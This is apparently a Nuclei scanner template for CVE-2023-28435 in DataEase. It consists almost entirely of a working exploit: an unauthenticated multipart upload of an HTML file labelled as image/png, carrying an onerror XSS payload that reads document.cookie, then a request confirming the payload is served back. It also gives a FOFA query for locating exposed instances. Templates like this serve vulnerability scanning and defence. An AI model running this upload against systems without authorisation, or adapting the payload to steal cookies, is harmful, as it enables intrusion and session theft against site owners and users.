id: CVE-2023-28435

info:
  name: DataEase-xss
  author: oway
  severity: high
  description: File upload interface does not do permission verification exists XSS vulnerability
  reference:
    - https://github.com/dataease/dataease/security/advisories/GHSA-625h-q3g9-rffc
  tags: dataease,xss
  metadata: 
    fofa-query: title=="DataEase"
variables:
  a1: "{{randstr}}"

requests:
  - raw:
      - |
        POST /static/resource/upload/{{a1}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: curl/7.86.0
        Accept: */*
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebkitFormBoundary1Cyqvj2ugswPkfY5
        Content-Length: 222

        ------WebkitFormBoundary1Cyqvj2ugswPkfY5
        Content-Disposition: form-data; name="file"; filename="03.html"
        Content-Type: image/png

        <img src=x onerror=alert(document.cookie)>
        ------WebkitFormBoundary1Cyqvj2ugswPkfY5--

  - raw:
      - |+
        GET /static-resource/{{a1}}.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: curl/7.86.0
        Accept: */*
        Connection: close
    matchers:
      - type: word
        words: 
          - "<img src=x onerror=alert(document.cookie)>"